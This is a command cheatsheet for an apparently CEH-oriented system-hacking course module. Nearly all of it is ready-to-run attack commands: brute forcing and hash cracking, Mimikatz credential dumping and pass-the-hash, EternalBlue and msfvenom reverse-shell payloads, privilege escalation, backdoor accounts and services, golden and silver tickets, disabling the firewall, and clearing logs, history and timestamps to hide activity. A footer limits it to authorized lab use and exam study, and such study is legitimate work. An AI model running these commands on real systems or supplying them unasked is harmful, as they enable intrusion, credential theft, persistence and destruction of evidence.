# Module 06 Cheatsheet — Quick Command Reference

Every command referenced across files 01–07, grouped by task. See the linked topic file for full context on any entry.

---

## Password Cracking → [01](./01-Password-Cracking.md)

```bash
# THC-Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.1.9
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://10.10.1.9
hydra -l admin -P passwords.txt ftp://10.10.1.5
hydra -l administrator -P passwords.txt rdp://10.10.1.20
hydra -l administrator -P passwords.txt smb://10.10.1.20
hydra -l admin -P passwords.txt 10.10.1.9 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
hydra -l root -P passwords.txt mysql://10.10.1.30
hydra -l admin -P passwords.txt -t 4 -f ssh://10.10.1.9

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_hash.txt

# hashcat
hashcat -a 3 -m 0 md5_hashes.txt ?l?l?l?d?d?d
hashcat -m 0 -a 3 -i --increment-min=6 --increment-max=10 <hash> ?a?a?a?a?a?a?a?a?a?a
hashcat -a 3 -m 0 md5_hashes.txt -1 ?l?u ?1?1?1?1?1
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt   # NTLMv2
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt     # AS-REP
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt       # Kerberoast TGS

# Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -wrf
responder -I eth0 -A

# ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Impacket Kerberos attacks
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.1.1 -format hashcat
GetUserSPNs.py corp.local/lowpriv:Password123 -dc-ip 10.10.1.1 -request

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /domain:corp.local /user:krbtgt
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
sekurlsa::tickets /export
kerberos::ptt <ticket>.kirbi

# pwdump7 / DSInternals
PwDump7.exe > hashes.txt
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\SYSTEM'
Get-ADDBAccount -All -DBPath 'C:\temp\ntds.dit' -BootKey $key

# RainbowCrack
rtgen ntlm loweralpha-numeric 1 7 0 3800 33554432 0
rtsort *.rt
rcrack *.rt -h <hash>
rcrack *.rt -l hashes.txt

# Manual FOR-loop password guessing (cmd.exe)
FOR /F "tokens=1,2*" %i in (credentials.txt) do net use \\victim.com\IPC$ %j /u:victim.com\%i 2>>nul && echo %time% %date% >> outfile.txt
```

## Vulnerability Exploitation → [02](./02-Exploiting-Vulnerabilities.md)

```bash
# Recon
systeminfo > systeminfo.txt
wes systeminfo.txt
wes -e systeminfo.txt

searchsploit -u
searchsploit vsftpd 2.3.4
searchsploit -m 12345
searchsploit --cve CVE-2021-34527

# Metasploit workflow
msf > search <keyword/CVE>
msf > use exploit/<path>
msf > show options / show targets / show payloads
msf > set RHOSTS <target>
msf > set payload <payload>
msf > check
msf > exploit

# EternalBlue example
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(...) > set RHOSTS 10.10.1.15
msf exploit(...) > set LHOST 10.10.1.5
msf exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(...) > exploit

# msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "\x00"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.1.5 LPORT=4444 -f elf -o shell.elf

# Buffer overflow dev workflow
nc -nv <IP> <Port>
generic_send_tcp <IP> <Port> spike_script SKIPVAR SKIPSTR
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q <EIP_value>
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

# Immunity Debugger / mona.py
!mona modules
!mona bytearray -b "\x00"
!mona compare -f <addr> -a <esp_addr>
!mona jmp -r esp -m <module.dll>
!mona find -s "\xff\xe4" -m <module.dll>
!mona pc 10400
!mona po <EIP_value>

# Listener
nc -nvlp 4444
msf > use exploit/multi/handler
```

## Privilege Escalation → [03](./03-Privilege-Escalation.md)

```powershell
# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
Install-ServiceBinary -Name '<VulnSvcName>'
Restart-Service -Name '<VulnSvcName>'

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser | Select samaccountname,pwdlastset,logoncount
Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer | Select name,operatingsystem
Get-NetOU
Get-ObjectAcl -SamAccountName "<group>" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs
Get-PathAcl -Path \\Windows11\Users
Get-NetForest
Get-NetForestCatalog
```
```cmd
:: WinPEAS / LinPEAS / BeRoot
winPEASx64.exe quiet applicationinfo
winPEASx64.exe quiet servicesinfo
winPEASx64.exe quiet windowscreds
./linpeas.sh -a > linpeas_output.txt
BeRoot.exe -f

:: accesschk
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <ServiceName>
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
```
# UAC bypass via Metasploit
msf > use exploit/windows/local/bypassuac
msf > use exploit/windows/local/bypassuac_injection
msf > use exploit/windows/local/bypassuac_fodhelper
msf > use exploit/windows/local/bypassuac_eventvwr
msf > use exploit/windows/local/bypassuac_comhijack
meterpreter > getsystem
meterpreter > getuid

# Domain trust enumeration
nltest /domain_trusts

# Seatbelt
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe <Command> -full
Seatbelt.exe -group=system -outputfile="C:\Temp\out.txt"

# pwncat
pwncat$ escalate list
pwncat$ escalate list -u root
pwncat$ escalate run
```

## Executing Applications / Keyloggers → [04](./04-Executing-Applications-Keyloggers-Spyware.md)

```
# Meterpreter keylogging
ps
getpid
migrate <PID>
keyscan_start
keyscan_dump
```
```powershell
winrs -r:http://10.10.1.20:5985 -u:administrator -p:Password123 cmd
Enter-PSSession -ComputerName 10.10.1.20 -Credential (Get-Credential)
Invoke-Command -ComputerName 10.10.1.20 -ScriptBlock { whoami } -Credential $cred
```
```bash
evil-winrm -i 10.10.1.20 -u administrator -p 'Password123'
evil-winrm -i 10.10.1.20 -u administrator -H '<NTLM_hash>'
```
```cmd
sc \\10.10.1.20 create backdoorsvc binPath= "cmd /c net user hacker Passw0rd! /add" start= auto
sc \\10.10.1.20 start backdoorsvc
wmic /node:10.10.1.20 /user:administrator /password:Password123 process call create "cmd.exe /c whoami > C:\out.txt"

PsExec.exe \\10.10.1.20 -s cmd.exe
PsExec.exe \\10.10.1.20 -u administrator -p Password123 cmd /c "whoami"
PsExec.exe \\10.10.1.20 -c payload.exe
```

## Steganography → [05](./05-Hiding-Files-Rootkits-ADS-Steganography.md)

```bash
# OpenStego
openstego embed -mf secret.txt -cf cover.png -sf output.png -p MyPassword
openstego extract -sf output.png -xf ./extracted/ -p MyPassword

# steghide
steghide embed -cf cover.jpg -ef secret.txt -p MyPassword
steghide extract -sf cover.jpg -p MyPassword
steghide info cover.jpg

# snow
snow -C -p MyPassword -m "the secret message" cover.txt output.txt
snow -C -p MyPassword output.txt

# zsteg
zsteg cover.png
zsteg -a cover.png

# Integrity baselining
aide --init
aide --check
```

## NTFS Alternate Data Streams → [05](./05-Hiding-Files-Rootkits-ADS-Steganography.md)

```cmd
notepad myfile.txt:lion.txt
type C:\Trojan.exe > C:\Readme.txt:Trojan.exe
mklink backdoor.exe Readme.txt:Trojan.exe
backdoor.exe
more < C:\Readme.txt:secret.txt

streams.exe -s C:\Users\Public
lads.exe C:\ /s
```

## Persistence & Domain Dominance → [06](./06-Persistence-and-Domain-Dominance.md)

```
# Sticky Keys via Metasploit
msf > use post/windows/manage/sticky_keys
msf post(...) > set SESSION 1
msf post(...) > run
```
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\victim\backdoor.exe"
copy backdoor.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

wmic /node:DC01 process call create "net user /add PiratedProcess Du**Y01"
PsExec.exe \\DC01 -accepteula net localgroup "Administrators" PiratedProcess /add
```
```
# Mimikatz — DPAPI / Skeleton Key / Golden & Silver Ticket
lsadump::backupkeys /system:DC01 /export
privilege::debug
misc::skeleton
kerberos::golden /user:fakeadmin /domain:corp.local /sid:<SID> /krbtgt:<hash> /ticket:golden.kirbi
kerberos::ptt golden.kirbi
kerberos::golden /user:fakeadmin /domain:corp.local /sid:<SID> /target:fileserver01.corp.local /service:cifs /rc4:<hash> /ticket:silver.kirbi
kerberos::ptt silver.kirbi
```
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs
```
```cmd
:: Living-off-the-land reference
wmic os where Primary='TRUE' reboot
wmic service get name,displayname,pathname,startmode
wmic /node:"<target>" product get name,version,vendor
wmic useraccount get name,sid
net config rdr
net computer \\computername /add
net view
net share
route print
netstat -r
ipconfig /all
sc queryex type=service state=all
netsh advfirewall set allprofiles state off
psexec -i \\<RemoteSystem> cmd
```

## Covering Tracks → [07](./07-Covering-Tracks.md)

```cmd
:: Auditing
auditpol /get /category:*
auditpol /set /category:"system","account logon" /success:disable /failure:disable
auditpol /set /category:"system","account logon" /success:enable /failure:enable

:: Clearing logs
wevtutil el
wevtutil cl system
wevtutil cl application
wevtutil cl security
```
```
meterpreter > clearev
```
```powershell
Clear-EventLog "Windows PowerShell"
Clear-EventLog -LogName Diag,OSession -ComputerName localhost,Server02
Clear-EventLog -LogName application,system -Confirm
```
```bash
# Linux log clearing
cat /dev/null > /var/log/auth.log

# Bash history
export HISTSIZE=0
history -c
history -w
cat /dev/null > ~/.bash_history && history -c && exit
shred ~/.bash_history
shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
```
```cmd
:: OS artifact cleanup
type C:\SecretFile.txt > C:\LegitFile.txt:SecretFile.txt
more < C:\SecretFile.txt

timestomp file_name.doc -z "01/01/2020 00:00:00"

fsutil behavior set disablelastaccess 1
powercfg.exe /hibernate off

cipher /w:C:\Users\victim\Documents
cipher /w:C

ipconfig /displaydns
ipconfig /flushdns
```
```powershell
(Get-Item $File_name).LastWriteTime = $(Get-Date).AddHours(-10)
```
```bash
# macOS
sudo killall -INFO mDNSResponder
defaults write com.apple.finder AppleShowAllFiles FALSE
killall Finder
chflags hidden <filename>

# Linux timestamp modification
touch -a -d '2020-01-01 00:00:00' payload.sh
touch -m -d '2020-01-01 00:00:00' payload.sh
```
```cmd
:: Hiding files/folders/users — Windows
attrib +h +s <FolderName>
net user <UserName> <Password> /add
net user <UserName> /active:yes
net user <UserName> /active:no
```
```bash
# Hiding files/folders — Linux
mv MaliciousFile.txt .MaliciousFile.txt
ls -a
mkdir .HiddenMaliciousFiles
touch .HiddenMaliciousFiles/.MaliciousFile.txt
```

---

## Full Port / Protocol Quick Reference

| Service | Port(s) | Relevant to |
|---|---|---|
| LLMNR | UDP 5355 | Poisoning (file 01) |
| NBT-NS | UDP 137 | Poisoning (file 01) |
| Kerberos | TCP/UDP 88 | Kerberos attacks (files 01, 06) |
| SMB | TCP 445 | Relay/EternalBlue (files 01, 02) |
| WinRM (HTTP) | TCP 5985 | Remote execution (file 04) |
| WinRM (HTTPS) | TCP 5986 | Remote execution (file 04) |
| RDP | TCP 3389 | Brute force (file 01) |
| DCOM (WMI) | TCP 135 | Remote execution (file 04) |
| PsExec / SMB admin shares | TCP 445 | Remote execution (files 04, 06) |

---

*All commands above are reproduced for authorized lab use and CEH exam study only. See [README.md](./README.md) for the full topic index and tool directory.*
